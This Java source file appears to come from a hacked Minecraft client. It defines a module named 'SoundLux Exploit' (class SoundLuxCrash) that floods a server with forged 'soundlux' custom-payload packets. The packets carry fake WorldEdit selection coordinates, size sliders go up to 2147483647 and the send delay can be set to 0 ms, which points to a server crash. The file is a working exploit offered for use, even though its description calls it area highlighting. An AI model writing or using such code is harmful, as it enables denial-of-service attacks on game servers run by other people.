package ru.fuctorial.fuctorize.module.impl;

import cpw.mods.fml.common.network.internal.FMLProxyPacket;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import org.lwjgl.input.Keyboard;
import ru.fuctorial.fuctorize.FuctorizeClient;
import ru.fuctorial.fuctorize.module.Category;
import ru.fuctorial.fuctorize.module.Module;
import ru.fuctorial.fuctorize.module.settings.BindSetting;
import ru.fuctorial.fuctorize.module.settings.SliderSetting;
import ru.fuctorial.fuctorize.utils.NetUtils;
import ru.fuctorial.fuctorize.utils.TimerUtils;

import java.nio.charset.StandardCharsets;

public class SoundLuxCrash extends Module {

    private SliderSetting delay;
    private SliderSetting sizeXZ;
    private SliderSetting sizeY;
    private SliderSetting offsetY;

    private final TimerUtils timer = new TimerUtils();

    public SoundLuxCrash(FuctorizeClient client) {
        super(client);
    }

    @Override
    public void init() {
        setMetadata("soundluxcrash", "SoundLux Exploit", Category.EXPLOIT);

         
        delay = new SliderSetting("Delay (ms)", 100.0, 0.0, 2000.0, 10.0);
        sizeXZ = new SliderSetting("Size X/Z", 2.0, 1.0, 2147483647.0, 1.0);
        sizeY = new SliderSetting("Size Y", 2.0, 1.0, 2147483647.0, 1.0);
        offsetY = new SliderSetting("Offset Y", 0.0, -100.0, 100.0, 1.0);

        addSetting(delay);
        addSetting(sizeXZ);
        addSetting(sizeY);
        addSetting(offsetY);
        addSetting(new BindSetting("Bind", Keyboard.KEY_NONE));
    }

    @Override
    public String getDescription() {
        return "Spams SoundLux packets to highlight area around player via WorldEdit.";
    }

    @Override
    public void onUpdate() {
        if (mc.thePlayer == null || mc.getNetHandler() == null) return;

        if (timer.hasReached((long) delay.value)) {
            sendFakeSelectionPacket();
            timer.reset();
        }
    }

    @Override
    public void onDisconnect() {
         
        if (this.isEnabled()) {
            this.toggle();
        }
    }

    private void sendFakeSelectionPacket() {
         
        int px = (int) Math.floor(mc.thePlayer.posX);
        int py = (int) Math.floor(mc.thePlayer.boundingBox.minY);
        int pz = (int) Math.floor(mc.thePlayer.posZ);

        int radius = (int) sizeXZ.value;
        int height = (int) sizeY.value;
        int yOff = (int) offsetY.value;

         
        int x1 = px - radius;
        int y1 = py + yOff;
        int z1 = pz - radius;

        int x2 = px + radius;
        int y2 = y1 + height;
        int z2 = pz + radius;

         
         
        String payloadStr = String.format("answer;%d,%d,%d,%d,%d,%d", x1, y1, z1, x2, y2, z2);

         
        ByteBuf buf = Unpooled.buffer();

         
         
         
         
        buf.writeByte(0);

         
         
        byte[] stringBytes = payloadStr.getBytes(StandardCharsets.UTF_8);
        writeVarInt(buf, stringBytes.length);  
        buf.writeBytes(stringBytes);

         
        FMLProxyPacket packet = new FMLProxyPacket(buf, "soundlux");
        NetUtils.sendPacket(packet);
    }

     
    private void writeVarInt(ByteBuf buf, int input) {
        while ((input & 0xFFFFFF80) != 0) {
            buf.writeByte((input & 0x7F) | 0x80);
            input >>>= 7;
        }
        buf.writeByte(input);
    }
}